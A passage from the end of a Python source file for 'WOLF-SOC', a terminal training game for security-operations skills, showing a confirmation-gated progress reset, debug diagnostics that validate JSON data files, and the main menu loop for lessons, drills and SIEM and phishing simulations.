    ui.panel("TIMELINE", timeline, color=MINT if score >= 80 else GOLD)
    print(f"\n  {DIM}Press any key to return to Main Deck...{RST}")
    getch()
    return muted


def reset_training_progress(
    progress_paths: tuple[Path, ...] | None = None,
) -> list[str]:
    """Delete ONLY training progress files; never touch incident reports or other files."""
    targets = progress_paths if progress_paths is not None else (acad.PROGRESS_PATH, drill.PROGRESS_PATH)
    removed: list[str] = []
    for path in targets:
        if path.is_file():
            path.unlink()
            removed.append(path.name)
    return removed


def confirm_and_reset_progress(
    muted: bool,
    bgm: BackgroundBeat | None = None,
    progress_paths: tuple[Path, ...] | None = None,
) -> tuple[bool, str]:
    """Prompt for explicit [Y] confirmation before resetting training progress only."""
    clear()
    header("WOLF-SOC · RESET PROGRESS", "Confirm", muted, bgm)
    ui.wolf_say(
        "alert",
        f"{GOLD}{BOLD}Reset training progress?{RST}",
        f"{DIM}This only clears campaign & exam/acronym mastery.{RST}",
    )
    print()
    ui.panel(
        "SCOPE OF RESET",
        [
            "Clears: academy_progress.json & exam_drill_progress.json",
            "Keeps : All saved SIEM/Phishing reports and other files untouched.",
        ],
        color=GOLD,
    )
    ui.footer([("Y", "Confirm Reset"), ("N / Any Key", "Cancel")])

    ch = getch().lower()
    if ch == "y":
        removed = reset_training_progress(progress_paths)
        play_sfx("good", muted)
        if removed:
            return muted, f"✓ Reset training progress ({', '.join(removed)}). Reports preserved."
        return muted, "✓ Training progress is already empty. Reports preserved."

    play_sfx("blip", muted)
    return muted, "Reset canceled — training progress unchanged."


def run_debug_diagnostics() -> int:
    """Verify environment, audio buffers, and all JSON assets under data/."""
    cols, rows = shutil.get_terminal_size((80, 24))
    print("=== WOLF-SOC DEBUG DIAGNOSTICS ===")
    print(f"Python      : {sys.version.split()[0]}")
    print(f"Terminal    : {cols}x{rows} cols/rows")
    print(f"paplay path : {shutil.which('paplay') or 'MISSING (headless/muted ok)'}")
    print("BGM_TRACKS  : " + ", ".join(f"{k}={len(v):,}B" for k, v in se.BGM_TRACKS.items()))
    print("SFX_WAVS    : " + ", ".join(f"{k}={len(v):,}B" for k, v in se.SFX_WAVS.items()))

    errors = 0
    for jf in sorted((BASE_DIR / "data").rglob("*.json")):
        try:
            obj = json.loads(jf.read_text(encoding="utf-8"))
            count = len(obj) if isinstance(obj, (list, dict)) else 1
            print(f"[OK]   {jf.relative_to(BASE_DIR)} ({count} entries)")
        except Exception as exc:
            errors += 1
            print(f"[FAIL] {jf.relative_to(BASE_DIR)} -> {exc}")

    print(f"Mini-Labs   : {len(mini_lab.LABS)} interactive stick-figure scenes")
    print(f"Result      : {'ALL CHECKS PASSED' if errors == 0 else f'{errors} JSON ERROR(S)'}")
    return 1 if errors else 0


def main() -> None:
    bgm = BackgroundBeat()
    bgm.start()
    muted = False
    all_diagrams = diag.load_all_diagrams()
    status_banner = ""

    sys.stdout.write("\033[?1049h\033[?25l")
    sys.stdout.flush()
    try:
        while True:
            clear()
            acad_prog = acad.load_progress()
            drill_prog = drill.load_progress()
            camp_pct = int(round(100 * len(acad_prog) / max(1, len(acad.LESSONS))))
            total_nodes = sum(len(d["nodes"]) for d in all_diagrams)

            mood = "hype" if camp_pct == 100 else "idle"
            header("WOLF-SOC · CYBER DECK", f"Camp {camp_pct}%", muted, bgm)
            ui.wolf_say(
                mood,
                f"{BOLD}Campaign  :{RST} {bar(len(acad_prog), len(acad.LESSONS), 16, MINT)}",
                f"{BOLD}Acronyms  :{RST} {bar(len(drill_prog['mastered_terms']), len(drill.ACRONYMS), 16, CYAN)}",
                f"{BOLD}Blueprints:{RST} {GOLD}{len(all_diagrams)} diagrams{RST} {DIM}({total_nodes} nodes · {len(mini_lab.LABS)} mini-labs){RST}",
            )
            print()

            ui.divider("ACADEMY & DRILLS", color=PURP)
            print(f"  {MINT}[1]{RST} {BOLD}Cyber Campaign{RST}     {DIM}6-tier story & boss fights{RST}")
            print(f"  {CYAN}[2]{RST} {BOLD}Exam & Acronyms{RST}    {DIM}106 terms · 5 domains · Wolf Coach{RST}")
            print(f"  {GOLD}[3]{RST} {BOLD}Tech Diagrams{RST}      {DIM}4 tabs · interactive ASCII blueprints{RST}")
            print(f"  {MINT}[4]{RST} {BOLD}Visual Mini-Labs{RST}   {DIM}4 live stick-figure scenes  O{RST}")
            print(f"{' ' * 52}{DIM}/|\\{RST}")
            print(f"{' ' * 52}{DIM}/ \\  {RST}\n")

            ui.divider("SOC SHIFT SIMS", color=RED)
            print(f"  {PINK}[5]{RST} {BOLD}Shift #1 · SIEM{RST}    {DIM}RetailPOS alert triage & SHA-256 custody{RST}")
            print(f"  {PINK}[6]{RST} {BOLD}Shift #2 · Phish{RST}   {DIM}Email headers · SPF/DKIM/DMARC lab{RST}")

            if status_banner:
                print(f"\n  {MINT}{status_banner}{RST}")
                status_banner = ""

            ui.footer([("1-6", "Open"), ("V", "Vibe"), ("M", "Mute"), ("R", "Reload"), ("X", "Reset"), ("Q", "Quit")])

            ch = getch().lower()
            if ch == "q":
                break
            elif ch == "m":
                muted = ui.toggle_mute(muted, bgm)
            elif ch == "v":
                muted = ui.cycle_vibe(muted, bgm)
                play_sfx("blip", muted)
            elif ch == "t":
                play_sfx("fanfare", muted)
            elif ch == "x":
                muted, status_banner = confirm_and_reset_progress(muted, bgm)
            elif ch == "r":
                try:
                    importlib.reload(acad)
                    importlib.reload(drill)
                    importlib.reload(diag)
                    importlib.reload(mini_lab)
                    all_diagrams = diag.load_all_diagrams()
                    play_sfx("good", muted)
                    status_banner = "✓ Hot-reloaded diagrams & training modules!"
                except Exception as exc:
                    play_sfx("bad", muted)
                    status_banner = f"✗ Reload error: {exc}"
            elif ch == "1":
                play_sfx("blip", muted)
                muted = acad.run_menu(muted=muted, bgm=bgm)
            elif ch == "2":
                play_sfx("blip", muted)
                muted = run_unified_exam_bank(drill_prog, all_diagrams, muted, bgm)
            elif ch == "3":
                play_sfx("blip", muted)
                muted = diag.run_menu(muted=muted, bgm=bgm)
            elif ch == "4":
                play_sfx("blip", muted)
                muted = mini_lab.run_menu(muted=muted, bgm=bgm)
            elif ch == "5":
                play_sfx("blip", muted)
                muted = run_siem_triage_shift(muted, bgm)
            elif ch == "6":
                play_sfx("blip", muted)
                muted = run_phish_forensics_shift(muted, bgm)
    finally:
        bgm.stop()
        sys.stdout.write("\033[?25h\033[?1049l")
        sys.stdout.flush()


if __name__ == "__main__":
    if "--debug" in sys.argv:
        if "--check" in sys.argv:
            raise SystemExit(run_debug_diagnostics())
        run_debug_diagnostics()
        input("\nPress Enter to launch Wolf-SOC in debug mode (or Ctrl+C to abort)...")
        try:
            main()
        except Exception:
            traceback.print_exc()
            input("\n[DEBUG] Unhandled exception caught above. Press Enter to exit...")
    else:
        main()
